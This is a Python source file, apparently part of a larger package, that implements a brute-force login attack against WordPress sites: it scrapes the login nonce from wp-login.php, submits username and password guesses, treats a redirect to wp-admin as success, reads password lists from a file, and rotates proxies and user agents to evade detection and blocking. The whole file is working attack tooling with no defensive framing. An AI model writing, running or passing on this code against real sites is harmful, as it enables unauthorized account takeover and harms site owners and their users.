# wordpress_bruteforce.py in your web_server_package

import requests
from bs4 import BeautifulSoup
import random
from utils import get

def get_random_user_agent():
    return random.choice(get.user_agents())

def get_random_proxy():
    return random.choice(get.proxies("proxies"))

def login_wordpress(url, username, password):
    login_url = url.rstrip('/') + '/wp-login.php'
    session = requests.Session()

    headers = {
        "User-Agent": get_random_user_agent()
    }
    session.headers.update(headers)

    proxy = get_random_proxy()
    proxies = {'http': proxy, 'https': proxy}

    response = session.get(login_url, proxies=proxies)
    soup = BeautifulSoup(response.content, 'html.parser')
    wp_nonce_field = soup.find('input', attrs={'name': '_wpnonce'})

    login_data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'testcookie': '1'
    }

    if wp_nonce_field:
        login_data[wp_nonce_field.get('name')] = wp_nonce_field.get('value')

    response = session.post(login_url, data=login_data, proxies=proxies)
    return 'wp-admin' in response.url

def attempt_login(url, username, password):
    return login_wordpress(url, username, password)

def load_passwords_from_file(filename):
    with open(filename, 'r') as f:
        return [line.strip() for line in f.readlines()]
